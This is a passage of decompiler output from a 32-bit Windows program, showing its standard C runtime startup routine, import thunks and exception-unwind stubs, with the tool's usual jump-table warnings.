  undefined *puStack16;
  undefined *puStack12;
  undefined4 local_8;
  
  puStack12 = &DAT_0040d488;
  puStack16 = &DAT_004076f4;
  uStack20 = *in_FS_OFFSET;
  *in_FS_OFFSET = &uStack20;
  local_1c = &stack0xffffff78;
  local_8 = 0;
  __set_app_type(2);
  _DAT_0040f94c = 0xffffffff;
  _DAT_0040f950 = 0xffffffff;
  puVar1 = (undefined4 *)__p__fmode();
  *puVar1 = DAT_0040f948;
  puVar1 = (undefined4 *)__p__commode();
  *puVar1 = DAT_0040f944;
  _DAT_0040f954 = *(undefined4 *)_adjust_fdiv_exref;
  FUN_0040793f();
  if (_DAT_0040f870 == 0) {
    __setusermatherr(&LAB_0040793c);
  }
  FUN_0040792a();
  _initterm(&DAT_0040e008,&DAT_0040e00c);
  local_70 = (int)DAT_0040f940;
  __getmainargs(&local_64,&local_74,&local_68,DAT_0040f93c,&local_70);
  _initterm(&DAT_0040e000,&DAT_0040e004);
  pbVar4 = *(byte **)_acmdln_exref;
  if (*pbVar4 != 0x22) {
    do {
      if (*pbVar4 < 0x21) goto LAB_004078ad;
      pbVar4 = pbVar4 + 1;
    } while( true );
  }
  do {
    pbVar4 = pbVar4 + 1;
    if (*pbVar4 == 0) break;
  } while (*pbVar4 != 0x22);
  if (*pbVar4 != 0x22) goto LAB_004078ad;
  do {
    pbVar4 = pbVar4 + 1;
LAB_004078ad:
  } while ((*pbVar4 != 0) && (*pbVar4 < 0x21));
  local_60.dwFlags = 0;
  GetStartupInfoA(&local_60);
  if ((local_60.dwFlags & 1) == 0) {
    uVar2 = 10;
  }
  else {
    uVar2 = (uint)local_60.wShowWindow;
  }
  uVar5 = 0;
  pHVar3 = GetModuleHandleA((LPCSTR)0x0);
  local_6c = FUN_00401fe7(pHVar3,uVar5,pbVar4,uVar2);
                    // WARNING: Subroutine does not return
  exit(local_6c);
}



// WARNING: Exceeded maximum restarts with more pending

void __thiscall type_info::_type_info(type_info *this)

{
                    // WARNING: Could not recover jumptable at 0x00407918. Too many branches
                    // WARNING: Treating indirect jump as call
  _type_info();
  return;
}



void _initterm(void)

{
                    // WARNING: Could not recover jumptable at 0x00407924. Too many branches
                    // WARNING: Treating indirect jump as call
  _initterm();
  return;
}



void FUN_0040792a(void)

{
  _controlfp(0x10000,0x30000);
  return;
}



void FUN_0040793f(void)

{
  return;
}



// WARNING: Exceeded maximum restarts with more pending

uint __cdecl _controlfp(uint _NewValue,uint _Mask)

{
  uint uVar1;
  
                    // WARNING: Could not recover jumptable at 0x00407940. Too many branches
                    // WARNING: Treating indirect jump as call
  uVar1 = _controlfp();
  return uVar1;
}



void Unwind_00407950(void)

{
  FUN_0040181b();
  return;
}



void Unwind_0040795b(void)

{
  FUN_0040181b();
  return;
}



void Unwind_00407970(void)

{
  FUN_0040181b();
  return;
}



void Unwind_0040797b(void)

{
  FUN_0040181b();
  return;
}



void Unwind_00407986(void)

{
  FUN_00402a6f();
  return;
}



void Unwind_0040799c(void)

{
  int unaff_EBP;
  
  operator_delete(*(void **)(unaff_EBP + -0x10));
  return;
}


